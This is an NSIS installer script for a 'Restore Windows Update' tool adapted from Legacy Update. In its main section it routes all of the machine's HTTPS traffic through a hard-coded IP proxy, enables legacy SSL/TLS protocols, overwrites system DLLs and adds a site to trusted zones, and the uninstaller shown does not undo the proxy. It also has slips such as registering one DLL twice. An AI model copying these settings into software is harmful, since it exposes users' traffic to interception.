; This file is a modified version of Legacy Update installer one (by kirb)

!include Constants.nsh

Name         "${NAME}"
Caption      "${NAME}"
BrandingText "${NAME} ${VERSION}"
OutFile      "LegacyUpdate-${VERSION}.exe"
InstallDir   "$ProgramFiles\${NAME}"
InstallDirRegKey HKLM "${REGPATH_LEGACYUPDATE_SETUP}" "InstallDir"

Unicode               true
RequestExecutionLevel Admin
AutoCloseWindow       true
ManifestSupportedOS   all
ManifestDPIAware      true

VIAddVersionKey /LANG=1033 "ProductName"     "${NAME}"
VIAddVersionKey /LANG=1033 "ProductVersion"  "${VERSION}"
VIAddVersionKey /LANG=1033 "CompanyName"     "ItCoder"
VIAddVersionKey /LANG=1033 "FileDescription" "${NAME}"
VIAddVersionKey /LANG=1033 "FileVersion"     "${VERSION}"
VIProductVersion ${VERSION}
VIFileVersion    ${VERSION}

!define MUI_UI                       "modern_aerowizard.exe"
!define MUI_UI_HEADERIMAGE           "modern_aerowizard.exe"

!define MUI_CUSTOMFUNCTION_GUIINIT   OnShow
!define MUI_CUSTOMFUNCTION_UNGUIINIT un.OnShow
!define MUI_CUSTOMFUNCTION_ABORT     CleanUp

/*!define MUI_ICON                     "..\LegacyUpdate\icon.ico"
!define MUI_UNICON                   "..\LegacyUpdate\icon.ico"

!define MUI_HEADERIMAGE
!define MUI_HEADERIMAGE_BITMAP       "setupbanner.bmp"
!define MUI_HEADERIMAGE_UNBITMAP     "setupbanner.bmp"*/

!define MUI_TEXT_ABORT_TITLE         "Installation Failed"

!define MEMENTO_REGISTRY_ROOT        HKLM
!define MEMENTO_REGISTRY_KEY         "${REGPATH_RESTOREWINDOWSUPDATE_SETUP}"

!include FileFunc.nsh
!include Integration.nsh
!include LogicLib.nsh
!include MUI2.nsh
!include Sections.nsh
!include Win\WinError.nsh
!include Win\WinNT.nsh
!include WinMessages.nsh
!include WinCore.nsh
!include WinVer.nsh
!include WordFunc.nsh
!include x64.nsh

!include Common.nsh
!include AeroWizard.nsh
!include Download2KXP.nsh
!include DownloadVista7.nsh
!include Download8.nsh
!include DownloadWUA.nsh
!include RunOnce.nsh
!include UpdateRoots.nsh

!insertmacro GetParameters
!insertmacro GetOptions

!define MUI_PAGE_HEADER_TEXT         "Welcome to Restore Windows Update"
!define MUI_COMPONENTSPAGE_TEXT_TOP  "Choose next to start restoring process. An internet connection is required to download additional components from Microsoft. Your computer will restart automatically if needed. Close all other programs before continuing. This program uses code from LegacyUpdate installer."
!define MUI_PAGE_CUSTOMFUNCTION_PRE  ComponentsPageCheck
!define MUI_PAGE_CUSTOMFUNCTION_SHOW OnShow
!define MUI_PAGE_FUNCTION_GUIINIT    OnShow
!define MUI_CUSTOMFUNCTION_ONMOUSEOVERSECTION OnMouseOverSection

!insertmacro MUI_PAGE_COMPONENTS

!define MUI_PAGE_HEADER_TEXT         "Performing Actions"
!define MUI_PAGE_CUSTOMFUNCTION_SHOW OnShow

!insertmacro MUI_PAGE_INSTFILES

!define MUI_PAGE_HEADER_TEXT         "Reverse Restoring Action"
!define MUI_UNCONFIRMPAGE_TEXT_TOP   "Your internet configuration will revert to Windows Default. This will restore Windows Update on Windows 7 with SHA-2 support and above."
!define MUI_PAGE_CUSTOMFUNCTION_SHOW un.OnShow

!insertmacro MUI_UNPAGE_CONFIRM

!define MUI_PAGE_HEADER_TEXT         "Performing Actions"
!define MUI_PAGE_CUSTOMFUNCTION_SHOW un.OnShow

!insertmacro MUI_UNPAGE_INSTFILES

!insertmacro MUI_LANGUAGE "English"

!macro RestartWUAUService
	!insertmacro DetailPrint "Restarting Windows Update service..."
	SetDetailsPrint none
	ExecShellWait "" "$WINDIR\system32\net.exe" "stop wuauserv" SW_HIDE
	ExecShellWait "" "$WINDIR\system32\net.exe" "start wuauserv" SW_HIDE
	SetDetailsPrint listonly
!macroend

Function ComponentsPageCheck
	; Skip the page if we're being launched via RunOnce
	${If} ${IsRunOnce}
	${OrIf} ${IsPostInstall}
		Abort
	${EndIf}
FunctionEnd

Function OnShow
	Call AeroWizardOnShow
FunctionEnd

Function un.OnShow
	Call un.AeroWizardOnShow
FunctionEnd

Section -BeforeInstall
	!insertmacro InhibitSleep 1
SectionEnd



; Win2k prerequisities
Section "Windows 2000 Service Pack 4" W2KSP4
	SectionIn Ro
	Call DownloadW2KSP4
	Call RebootIfRequired
SectionEnd

Section "Windows 2000 Patches" MSXML
	SectionIn Ro
	Call InstallMSXML
	GetWinVer $0 Major
	GetWinVer $1 Minor
	${If} $0 == 5
	${AndIf} $1 == 0
	CopyFiles "$WINDIR\system32\winhttp.dll" "$WINDIR\system32\winhttp5.dll"
	CopyFiles "$INSTDIR\msxml3.dll" "$WINDIR\system32\msxml3.dll"
	${EndIf}
SectionEnd

Section "Internet Explorer 6.0 Service Pack 1" IE6SP1
	SectionIn Ro
	Call DownloadIE6
	Call RebootIfRequired
SectionEnd

Section "Windows Servicing Stack update" VISTASSU
	SectionIn Ro
	Call DownloadKB3205638
	Call DownloadKB4012583
	Call DownloadKB4015195
	Call DownloadKB4015380
	Call RebootIfRequired
SectionEnd

; 8 prerequisities
Section "Windows Servicing Stack update" WIN8SSU
	SectionIn Ro
	Call DownloadKB4598297
	Call RebootIfRequired
SectionEnd

; Shared prerequisites
Section "Windows Update Agent update" WUA
	SectionIn Ro
	Call DownloadWUA
SectionEnd

; Main installation
Section "Restore Windows Update" RESTOREWINDOWSUPDATE
	SetOutPath $INSTDIR
	WriteUninstaller "Uninstall.exe"
	Call UpdateRoots
	WriteRegDword		HKLM "${REGPATH_INETSETTINGS}" "MigrateProxy" 00000001
	WriteRegStr		HKLM "${REGPATH_INETSETTINGS}" "AutoConfigProxy" "wininet.dll"
	WriteRegDword		HKLM "${REGPATH_INETSETTINGS}" "ProxyEnable" 00000001
	WriteRegStr		HKLM "${REGPATH_INETSETTINGS}" "ProxyServer" "https=34.205.92.217:8079"
	WriteRegDword		HKLM "${REGPATH_INETSETTINGS}" "ProxyHttp1.1" 00000001
	WriteRegDword		HKLM "${REGPATH_INETSETTINGS}" "SecureProtocols" 0x000000a8
	WriteRegDword		HKCU "${REGPATH_INETSETTINGS}" "MigrateProxy" 00000001
	WriteRegStr		HKCU "${REGPATH_INETSETTINGS}" "AutoConfigProxy" "wininet.dll"
	WriteRegDword		HKCU "${REGPATH_INETSETTINGS}" "ProxyEnable" 00000001
	WriteRegStr		HKCU "${REGPATH_INETSETTINGS}" "ProxyServer" "https=34.205.92.217:8079"
	WriteRegDword		HKCU "${REGPATH_INETSETTINGS}" "ProxyHttp1.1" 00000001
	WriteRegDword		HKCU "${REGPATH_INETSETTINGS}" "SecureProtocols" 0x000000a8
	File "muweb.dll"
	File "wuweb.dll"
	CopyFiles	"$INSTDIR\muweb.dll" "$WINDIR\system32\muweb.dll"
	CopyFiles  "$INSTDIR\wuweb.dll" "$WINDIR\system32\wuweb.dll"
	ExecShellWait "" "$WINDIR\system32\regsvr32.exe" "$WINDIR\system32\muweb.dll"
	ExecShellWait "" "$WINDIR\system32\regsvr32.exe" "$WINDIR\system32\muweb.dll"
	GetWinVer $0 Major
	${If} $0 == 5
		File "Microsoft Update.url"
		File "Windows Update.url"
	  CopyFiles "$INSTDIR\*.url" "$DESKTOP"
		ExecShellWait "" "$WINDIR\system32\proxycfg.exe" '-u'
	${EndIf}
	${If} $0 == 6
		File "Microsoft Update website.lnk"
		File "Windows Update website.lnk"
	  CopyFiles "$INSTDIR\*.lnk" "$DESKTOP"
		ExecShellWait "" "$WINDIR\system32\netsh.exe" 'winhttp set proxy proxy-server="https=34.205.92.217:8079"'
  ${EndIf}
	

	; Add uninstall entry
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "DisplayName" "${NAME}"
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "DisplayIcon" '"$OUTDIR\Uninstall.exe",0'
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "DisplayVersion" "${VERSION}"
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "Publisher" "${NAME}"
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "URLInfoAbout" "${WEBSITE}"
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "UninstallString" '"$OUTDIR\Uninstall.exe"'
	WriteRegStr   HKLM "${REGPATH_UNINSTSUBKEY}" "QuietUninstallString" '"$OUTDIR\Uninstall.exe" /S'
	WriteRegDword HKLM "${REGPATH_UNINSTSUBKEY}" "NoModify" 1
	WriteRegDword HKLM "${REGPATH_UNINSTSUBKEY}" "NoRepair" 1

	; Hide WU shortcuts
	; TODO: How can we consistently find the shortcuts for non-English installs?
	${If} ${AtMostWinXP2003}
		${If} ${FileExists} "$COMMONSTARTMENU\Windows Update.lnk"
			CreateDirectory "$OUTDIR\Backup"
			Rename "$COMMONSTARTMENU\Windows Update.lnk" "$OUTDIR\Backup\Windows Update.lnk"
		${EndIf}

		${If} ${FileExists} "$COMMONSTARTMENU\Microsoft Update.lnk"
			CreateDirectory "$OUTDIR\Backup"
			Rename "$COMMONSTARTMENU\Microsoft Update.lnk" "$OUTDIR\Backup\Microsoft Update.lnk"
		${EndIf}
	${EndIf}

	; Add to trusted sites
	WriteRegDword HKCU "${REGPATH_ZONEDOMAINS}\${DOMAIN}"    "http"  2
	WriteRegDword HKCU "${REGPATH_ZONEDOMAINS}\${DOMAIN}"    "https" 2
	WriteRegDword HKCU "${REGPATH_ZONEESCDOMAINS}\${DOMAIN}" "http"  2
	WriteRegDword HKCU "${REGPATH_ZONEESCDOMAINS}\${DOMAIN}" "https" 2
SectionEnd

Section -Uninstall
	; Delete shortcut
	${UnpinShortcut} "$COMMONSTARTMENU\${NAME}.lnk"
	Delete "$COMMONSTARTMENU\${NAME}.lnk"

	; Delete Control Panel entry
	DeleteRegKey HKLM "${REGPATH_CPLNAMESPACE}"
	DeleteRegKey HKCR "${REGPATH_CPLCLSID}"

	; Restore shortcuts
	${If} ${FileExists} "$INSTDIR\Backup\Windows Update.lnk"
		Rename "$INSTDIR\Backup\Windows Update.lnk" "$COMMONSTARTMENU\Windows Update.lnk"
	${EndIf}

	${If} ${FileExists} "$INSTDIR\Backup\Microsoft Update.lnk"
		Rename "$INSTDIR\Backup\Microsoft Update.lnk" "$COMMONSTARTMENU\Microsoft Update.lnk"
	${EndIf}
SectionEnd

!define DESCRIPTION_REBOOTS "Your computer will restart automatically to complete installation."
!define DESCRIPTION_SUPEULA "By installing, you are agreeing to the Supplemental End User License Agreement for this update."
!define DESCRIPTION_MSLT    "By installing, you are agreeing to the Microsoft Software License Terms for this update."

!insertmacro MUI_FUNCTION_DESCRIPTION_BEGIN
	!insertmacro MUI_DESCRIPTION_TEXT ${W2KSP4}       "Updates Windows 2000 to Service Pack 4, as required to install the Windows Update Agent.$\r$\n${DESCRIPTION_REBOOTS} ${DESCRIPTION_SUPEULA}"
	!insertmacro MUI_DESCRIPTION_TEXT ${IE6SP1}       "Updates Internet Explorer to 6.0 SP1, as required for Legacy Update.$\r$\n${DESCRIPTION_REBOOTS} ${DESCRIPTION_SUPEULA}"
	!insertmacro MUI_DESCRIPTION_TEXT ${VISTASSU}     "Updates Windows Vista or Windows Server 2008 with additional updates required to resolve issues with the Windows Update Agent.$\r$\n${DESCRIPTION_REBOOTS}"
	!insertmacro MUI_DESCRIPTION_TEXT ${WUA}          "Installs the Windows Update Agent in the right version, as required for restoring Windows Update."
	!insertmacro MUI_DESCRIPTION_TEXT ${ROOTCERTS}    "Updates the root certificate store to a working version, and enables additional modern security features. Root certificates are used to verify the security of encrypted (https) connections. This fixes connection issues with some websites."
!insertmacro MUI_FUNCTION_DESCRIPTION_END

Function OnMouseOverSection
	${If} $0 == ${LEGACYUPDATE}
		${If} ${AtMostWinXP2003}
			StrCpy $0 "Installs Legacy Update, enabling access to the full Windows Update interface via the legacyupdate.net website. Windows Update will be configured to use the Legacy Update proxy server."
		${ElseIf} ${AtMostWinVista}
			StrCpy $0 "Installs Legacy Update, enabling access to the full Windows Update interface via the legacyupdate.net website, and Windows Update Control Panel. Windows Update will be configured to use the Legacy Update proxy server."
		${Else}
			StrCpy $0 "Installs the Legacy Update ActiveX control, enabling access to the classic Windows Update interface via the legacyupdate.net website."
		${EndIf}
		SendMessage $mui.ComponentsPage.DescriptionText ${WM_SETTEXT} 0 "STR:"
		EnableWindow $mui.ComponentsPage.DescriptionText 1
		SendMessage $mui.ComponentsPage.DescriptionText ${WM_SETTEXT} 0 "STR:$0"
	${EndIf}
FunctionEnd

Function .onInit
	SetShellVarContext All
	${If} ${RunningX64}
		SetRegView 64
	${EndIf}
	!insertmacro EnsureAdminRights
	SetDetailsPrint listonly

	${If} ${IsRunOnce}
	${OrIf} ${IsPostInstall}
		Call OnRunOnceLogon
	${EndIf}

	SetOutPath $PLUGINSDIR
	File Patches.ini

	${If} ${IsWin2000}
		; Determine whether Win2k prereqs need to be installed
		Call NeedsW2KSP4
		Pop $0
		${If} $0 == 0
			!insertmacro RemoveSection ${W2KSP4}
		${EndIf}

		Call NeedsIE6
		Pop $0
		${If} $0 == 0
			!insertmacro RemoveSection ${IE6SP1}
		${EndIf}
	${Else}
		!insertmacro RemoveSection ${W2KSP4}
		!insertmacro RemoveSection ${IE6SP1}
		!insertmacro RemoveSection ${MSXML}
	${EndIf}

	${If} ${IsWinVista}
		GetWinVer $0 ServicePack
		${If} $0 == 2
		Call NeedsVistaPostSP2
		Pop $0
		${If} $0 == 0
			!insertmacro RemoveSection ${VISTASSU}
		${EndIf}
		${Else}
		!insertmacro RemoveSection ${VISTASSU}
		${EndIf}
	${Else}
		!insertmacro RemoveSection ${VISTASSU}
	${EndIf}

	Call DetermineWUAVersion
	${If} $0 == ""
		!insertmacro RemoveSection ${WUA}
	${EndIf}

	${If} ${AtMostWin7}
	${OrIf} ${AtLeastWin8.1}
		!insertmacro RemoveSection ${WIN8SSU}
		${EndIf}

	${If} ${AtLeastWin8}
	  !insertmacro RemoveSection ${WUA}
  ${EndIf}

	; Try not to be too intrusive on Windows 10 and newer, which are (for now) fine
	${If} ${AtLeastWin10}
		!insertmacro RemoveSection ${ROOTCERTS}

		!insertmacro TaskDialog `'Legacy Update'` \
			`'Restoring Windows Update is intended for earlier versions of Windows'` \
			`'This will broke Windows Update completely.$\r$\n$\r$\nContinue anyway?'` \
			${TDCBF_YES_BUTTON}|${TDCBF_NO_BUTTON} \
			${TD_WARNING_ICON}
		${If} $0 != ${IDYES}
			Quit
		${EndIf}
	${EndIf}
FunctionEnd

Function CleanUp
	Call CleanUpRunOnce
	!insertmacro InhibitSleep 0
FunctionEnd

Function .onInstSuccess

	; Reboot now if we need to. Nothing further in this function will be run if we do need to reboot.
	Call RebootIfRequired

	Call CleanUp
FunctionEnd

Function .onInstFailed
	Call CleanUp
FunctionEnd

Function un.onInit
	SetShellVarContext All
	${If} ${RunningX64}
		SetRegView 64
	${EndIf}
	!insertmacro EnsureAdminRights
	SetDetailsPrint listonly
FunctionEnd

Function un.onUninstSuccess
	!insertmacro DetailPrint "Done"
	Call un.RebootIfRequired
	${IfNot} ${RebootFlag}
		Quit
	${EndIf}
FunctionEnd
